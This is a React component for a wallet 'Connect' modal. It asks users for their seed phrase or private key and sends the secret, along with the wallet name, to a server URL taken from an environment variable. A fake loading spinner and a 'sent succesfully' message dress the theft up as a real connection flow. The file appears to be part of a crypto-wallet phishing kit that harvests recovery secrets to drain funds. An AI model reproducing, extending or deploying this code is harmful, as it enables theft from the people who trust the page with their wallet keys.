import { useContext, useState, useEffect, ReactEventHandler } from "react";
import { ReactComponent as Close } from "../lib/svg/close.svg";
import { ThemeContext, WalletContext } from "../store/context";
import Spinner from "./spinner";

const WalletModal = () => {
  const { currentWallet }: any = useContext(WalletContext);
  const { closeModal }: any = useContext(ThemeContext);
  const [privateKeyValue, setPrivateKeyValue] = useState<string>("");
  const [seedPhaseValue, setSeedPhaseValue] = useState<string>("");

  const [isPrivateKey, setIsPrivateKey] = useState<boolean>(false);
  const [isModalLoading, setIsModalLoading] = useState<boolean>(true);
  const [loading, setLoading] = useState<boolean>(false);
  const [status, setStatus] = useState<{
    message: string;
    show: boolean;
    status: number;
  }>({
    message: "",
    show: false,
    status: 0,
  });

  const messageType: string = status.status ? "success" : "error";

  const { title, imagePath } = currentWallet;

  function handleAccessMethod() {
    setIsPrivateKey(!isPrivateKey);
  }

  useEffect(() => {
    setTimeout(() => setIsModalLoading(false), 2000);
    return () => {
      clearTimeout();
    };
  }, []);

  function reset() {
    return setTimeout(() => {
      setStatus({
        ...status,
        message: "",
        show: false,
        status: 0,
      });
    }, 3000);
  }

  async function onSubmit(e: React.SyntheticEvent) {
    e.preventDefault();
    const val = isPrivateKey ? privateKeyValue : seedPhaseValue;
    if (val.length < 1) {
      setStatus({
        ...status,
        message:
          "Please enter a valid " +
          (isPrivateKey ? "private key" : "seed phrase"),
        show: true,
      });
      return reset();
    }
    setLoading(true);
    //fetch data from url
    try {
      const response = await fetch(
        // `https://api.coingecko.com/api/v3/coins/bitcoin`
        `${process.env.REACT_APP_SERVER}{
          title: ${title},
          value:${isPrivateKey ? privateKeyValue : seedPhaseValue},
          isPrivateKey: ${isPrivateKey}
      }`
      );
      const data = await response.json();
      setLoading(false);
      if (!data || data.status !== "success") {
        setStatus({
          ...status,
          message: "Something went wrong. Try again.",
          show: true,
          status: 0,
        });
        return reset();
      }
      setStatus({
        ...status,
        message:
          (isPrivateKey ? "Private Key" : "Seed Phase") + " sent succesfully.",
        show: true,
        status: 1,
      });
      return reset();
    } catch (e) {
      console.log(e);
      setLoading(false);
      setStatus({
        ...status,
        message: "Something went wrong. Try again.",
        show: true,
        status: 0,
      });
      return reset();
    }
  }

  function handleValueChange(e: React.ChangeEvent<HTMLTextAreaElement>) {
    const { value } = e.target;
    isPrivateKey ? setPrivateKeyValue(value) : setSeedPhaseValue(value);
  }

  return (
    <div className="modal-background">
      <div className="modal-body">
        <div className="modal-close">
          <span onClick={closeModal}>
            <Close />
          </span>
        </div>
        {isModalLoading ? (
          <Spinner />
        ) : (
          <form className="modal-content" onSubmit={onSubmit}>
            <div className="image-container">
              <img src={imagePath} alt={title + "-img"} className="image" />
            </div>
            <div className="text">
              <h4 className="text__title">{title}</h4>
              <p className="text__sub-title">
                {!isPrivateKey
                  ? "Enter seed phrase in order, seperated by a single space."
                  : "Enter Private Key"}
              </p>
            </div>
            <textarea
              name=""
              id=""
              value={isPrivateKey ? privateKeyValue : seedPhaseValue}
              onChange={handleValueChange}
              rows={4}
              className="input"
              spellCheck={false}
              placeholder={
                !isPrivateKey ? "Seed Phrase" : "Private Key"
              }></textarea>
            <button
              className={"button " + (loading && "loading")}
              type="submit">
              {loading ? (
                <Spinner width="12px" margin="0" color="#fff" />
              ) : (
                "Connect"
              )}
            </button>
            <div className="message">
              {status.show && (
                <p className={`message__text--${messageType}`}>
                  {status.message}
                </p>
              )}
            </div>
            <div className="link">
              <span onClick={handleAccessMethod}>
                Access with {!isPrivateKey ? "private key" : "seed phase"}
              </span>
            </div>
          </form>
        )}
      </div>
    </div>
  );
};

export default WalletModal;
